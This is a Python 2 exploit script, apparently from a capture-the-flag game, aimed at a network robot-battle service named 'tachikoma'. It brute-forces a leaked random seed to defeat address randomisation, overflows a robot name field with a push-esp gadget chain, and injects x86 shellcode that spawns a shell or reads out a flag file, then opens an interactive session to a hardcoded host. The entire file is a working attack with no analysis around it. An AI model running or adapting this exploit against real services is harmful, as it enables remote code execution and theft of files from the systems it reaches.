import socket
import struct
import time
import telnetlib
import os
import sys

service = 'tachikoma'         # target service (required)
timeout = 3                 # define timeout here
author = 'm3m3d4'          # author

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

import ctypes

libc = ctypes.cdll.LoadLibrary('libc.so.6')

def calc_main(aim):
    for i in xrange(256):
        seed = (i << 12) | 0xf7700420
        libc.srand(seed)
        if aim == libc.rand():
            return seed
    return -1

def exploit(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    f = s.makefile('rw', bufsize=0)

    readuntil(f, 'Seed: ')
    ret = readuntil(f, '\n')
    ret = int(ret, 10)
    print ret
    main_addr = calc_main(ret)
    binary_base = main_addr - 0x2b420
    print 'binary_base: %s' % hex(binary_base)

    push_esp_ret = binary_base + 0x14b0
    sc = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
    sc = '\x6a\x05\x58\x99\x52\x6a\x61\x68\x69\x6b\x6f\x6d\x68\x74\x61\x63\x68\x68\x61\x67\x73\x2f\x68\x65\x2f\x66\x6c\x68\x2f\x68\x6f\x6d\x89\xe3\x89\xd1\xcd\x80\x89\xc3\x89\xe1\xb2\x80\xb0\x03\xcd\x80\x92\x89\xe1\xb3\x01\xb0\x04\xcd\x80\xb0\x01\xcd\x80'
    name = 'Z' * 0x2000
    name += 'Z' * 0x1800
    name += 'Z' * 0x200
    name += 'Z' * 0x100

    name += p(push_esp_ret) * (0x38/4)

    name += sc

    payload = """
AutoScan                    
{
    print( "Hit by missle" )
}

Core
{
    print( "Core" )
    ahead( 1 )
    endturn( )
}  

MissileHit
{
    print( "Hit by missle" )
}

FoundRobot
{
    print( "Find" )
}

Dead
{
}

Pinged
{
    print( "Pinged from" _cldbearing "heading" _cldheading )
}

Init
{
    name( "%s" )
    regcore( "Core" )
    regcldmissile( "MissileHit", 1 )
    regdtcrobot( "FoundRobot", 2 )
    regascan( "AutoScan", 3 )
    regping( "Pinged", 1 )
}
""" % (name)

    go = '1\n'
    go += '%d\n' % len(payload)
    go += payload

    f.write(go)

    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

if __name__ == '__main__':
    exploit('192.168.165.135', 9)
